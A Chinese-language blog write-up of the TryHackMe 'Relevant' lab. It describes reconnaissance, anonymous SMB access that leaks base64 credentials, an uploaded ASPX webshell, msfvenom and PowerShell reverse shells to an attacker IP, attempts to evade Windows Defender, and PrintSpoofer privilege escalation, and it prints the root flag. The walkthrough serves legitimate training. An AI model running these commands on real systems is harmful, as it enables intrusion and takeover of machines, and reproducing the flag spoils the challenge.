---
title: Relevant (Try Hack Me Writeup)
date: 2021-08-10T13:13:00+08:00
draft: false
url: "/2021/08/10/relevant-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/relevant

IP : 10.10.115.198

## Recon

- `rustscan -a 10.10.115.198`發現有開80
- 135
- 139
- 445
- 3389`nmap -A 10.10.115.198`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-09 01:58 EDT
Nmap scan report for 10.10.115.198
Host is up (0.28s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-08-09T06:00:45+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2021-08-08T05:57:43
|_Not valid after:  2022-02-07T05:57:43
|_ssl-date: 2021-08-09T06:01:24+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-08T23:00:47-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-09T06:00:49
|_  start_date: 2021-08-09T05:58:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.72 seconds
```

- 發現應該是 Winodws Server 2016 的機器

### 觀察網頁

- 去看 80 Port![](/uploads/2022/02/bb235-Wz90g9G.png)
- 是一個 IIS 的 Default Page掃目錄- `python3 dirsearch.py -u http://10.10.115.198/`
- ![](/uploads/2022/02/b00de-Z5TN3wB.png)
- 看起來沒什麼結果

### 觀察 SMB

- `smbclient --no-pass -L //10.10.115.198/`可以觀察到有一個 `nt4wrksv` 目錄
- ![](/uploads/2022/02/2881b-8B5dC11.png)`smbclient -N //10.10.115.198/nt4wrksv`- 就連上ㄌ
- ![](/uploads/2022/02/c0159-BKiLHzJ.png)
- `get passwords.txt`![](/uploads/2022/02/94ded-GmGYudx.png)觀察 `passwords.txt` 檔案- ![](/uploads/2022/02/dbc81-0ruQyhn.png)
- 會發現是編碼過後的東西，後面有 `==` 所以很明顯是 Base64`Qm9iIC0gIVBAJCRXMHJEITEyMw==`
- `QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk`解 Base64- 可以用 `base64 -d 嘗試把帳密用 RDP 連線- `xfreerdp +drives /u:Bob /v:10.10.115.198`
- `xfreerdp +drives /u:Bill /v:10.10.115.198`
- 但也都失敗ㄌQQ嘗試連線 SMB- ![](/uploads/2022/02/8ef44-0jHgQkI.png)
- 但也都失敗了

### 搜尋更多的 Port

- `rustscan -a 10.10.115.198 --accessible -r 1-65535`![](/uploads/2022/02/9c637-vASh02r.png)
- 發現真的有藏東西!!`49669`
- `49663`
- `49667`這邊我同時用 nmap 跑了一次，不過真的有夠慢QQ- `nmap -p- 10.10.115.198`
- ![](/uploads/2022/02/8b986-RMxh6CS.png)`nmap -A -p49669,49663,49667 10.10.115.198`- ![](/uploads/2022/02/35e2d-Ekzf2uB.png)
- 發現 49663 是一個 IIS webserver掃目錄- `python3 dirsearch.py -u http://10.10.115.198:49663/`
- 掃到 `aspnet_client`![](/uploads/2022/02/49fc6-Y8hxkis.png)
- 搜尋發現 `aspnet_client/system_web` 裡面常常會搭配一些特定字串https://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html?view=flipcard所以可以再依據字串掃一次- ![](/uploads/2022/02/d9d28-zMsZUx2.png)
- 還真的掃到了 `4_0_30319`

### 通靈掃描QQ

- 不知道為什麼機器死掉ㄌ，重新開的 IP 是 `10.10.63.244`
- 我們如果隨便訪問一個不存在的目錄，會回應404`curl -I http://10.10.63.244:49663/12334/`
- ![](/uploads/2022/02/e71a2-o4SUzYj.png)通靈覺得，說不定 webroot 有剛才 smb 的資料夾?- `curl -I curl -I http://10.10.63.244:49663/nt4wrksv/`
- 200! 還真的有!!![](/uploads/2022/02/90164-S3zKRkv.png)那我們是不是能取得剛剛 `passwords.txt` 的檔案- http://10.10.63.244:49663/nt4wrksv/passwords.txt
- ![](/uploads/2022/02/5d11b-KSZpoMG.png)
- 度ㄉ!!真的可以!!!!!

## 準備 Exploit

- 那我們應該可以用匿名登入的 smb 來上傳東西囉!準備一隻喵喵![](/uploads/2022/02/1d048-s4eBOpX.png)`smbclient -N //10.10.63.244/nt4wrksv`- ![](/uploads/2022/02/b6bff-L6DIdNv.png)嘗試用瀏覽器訪問!- ![](/uploads/2022/02/9f48e-kVrt6js.png)
- 成功!!!既然他是 IIS ，又是 ASPX，那我們應該可以傳個 aspx 的 webshell?- 網路上隨便找了一ㄍhttps://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
- 丟上去
- ![](/uploads/2022/02/3129e-GALqpOA.png)可以ㄟ!!!- ![](/uploads/2022/02/af57d-WbsRzYu.png)
- 好讚ㄛ可以看系統的資訊ㄌ- ![](/uploads/2022/02/1f0fc-JDuWVj0.png)亂逛系統- 輸入指令 "cd ......\Users\Bob\Desktop && dir"`![](https://i.imgur.com/hZrXxtO.png)`取得 user flag- `"cd ..\..\..\Users\Bob\Desktop && type user.txt"`
- ![](/uploads/2022/02/2897e-GBnyp6o.png)

### 戳 Reverse shell

雖然 Webshell 已經滿好用的了，但Reverse shell 用起來還是比較爽，我們來嘗試使用 Reverse shell  
下面提供了滿多我嘗試的方法，但大多數都失敗ㄌ，僅有最後一個成功，不過我把失敗的方法也都列出來

- 這邊先把 reverse shell 接收端開好等待`nc -nvvlp 7877`首先是透過 msfevnom 來產 `windows/shell_reverse_tcp`- `msfvenom -p windows/shell_reverse_tcp LHOST=10.13.21.55 LPORT=7877 -f aspx -o shell.aspx`
- ![](/uploads/2022/02/b04f4-JWgGngg.png)
- 丟上去`put shell.aspx`
- ![](/uploads/2022/02/d9294-Dia8cD4.png)不過失敗ㄌQQ再來用一樣的 payload 產 exe- `msfvenom -p windows/shell_reverse_tcp LHOST=10.13.21.55 LPORT=7877 -f exe -o shell.exe`
- 也還是失敗了使用 `Invoke-PowerShellTcp`- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
- 把檔案傳上去後執行`powershell ..\..\..\inetpub\wwwroot\nt4wrksv\Invoke-PowerShellTcp -Reverse -IPAddress 10.13.21.55 -Port 7877"`
- 竟然被 Defender 抓走ㄌ QQQ
- ![](/uploads/2022/02/3714f-tReOP8k.png)這邊有一些可以躲避 Defender 的方法- https://www.admin-magazine.com/mobile/Articles/How-to-Hide-a-Malicious-File
- 例如 `shikata_ga_nai`使用 `msfvenom -p windows/shell_reverse_tcp LHOST=10.13.21.55 LPORT=7877 -e x86/shikata_ga_nai -f exe -o shell.exe`- `shikata_ga_nai` 包裝 exe
- ![](/uploads/2022/02/d1d94-MLtpHjW.png)
- 還是被抓走ㄌ QQ最終解法，改用 `windows/x64/shell_reverse_tcp`- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.55 LPORT=7877 -f aspx -o shell.aspx`
- 竟然不用 Bypass Defender 就可以ㄌ![](/uploads/2022/02/43b7c-lQayBM0.png)
- ![](/uploads/2022/02/c720f-fcl8tnB.png)

## 提權

- 觀察我們的使用者`apppool\defaultapppool`
- ![](/uploads/2022/02/3109f-ooDaMzz.png)觀察我們的權限- `whoami /priv`
- ![](/uploads/2022/02/8047c-4mbDHeh.png)
- 我們可以`SeChangeNotifyPrivilege`
- `SeImpersonatePrivilege`
- `SeCreateGlobalPrivilege`搜尋發現 `SeImpersonatePrivilege` 權限- 可以用 Juicy Potato 進行提權https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505上傳 Juicy Potato- ![](/uploads/2022/02/9e4ff-5MGHFBk.png)
- 又被…抓病毒ㄌ觀察發現 `SeImpersonatePrivilege` 搭配作業系統版本，可能有一個 `PrintSpoofer` 的漏洞- https://github.com/itm4n/PrintSpoofer
- `wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`
- 載下來，並傳到靶機上依照說明來執行- `./PrintSpoofer64.exe -i -c cmd`
- ![](/uploads/2022/02/6a267-zXMoNus.png)
- 就直接變成 system 權限了!!取得 root flag- ![](/uploads/2022/02/48be3-Rc4JC5P.png)
- `THM{1fk5kf469devly1gl320zafgl345pv}`

## 心得

遇到走投無路時，記得乖乖的把所有 Port 都掃過一輪，說不定會柳暗花明又一村；在還沒有真正打進去之前，看到任何的線索都不要高興的太早，說不定都是唬人的QQ；Windows 的 Defender 好煩，看樣子該找時間來研究 Windows 的免殺ㄌ。
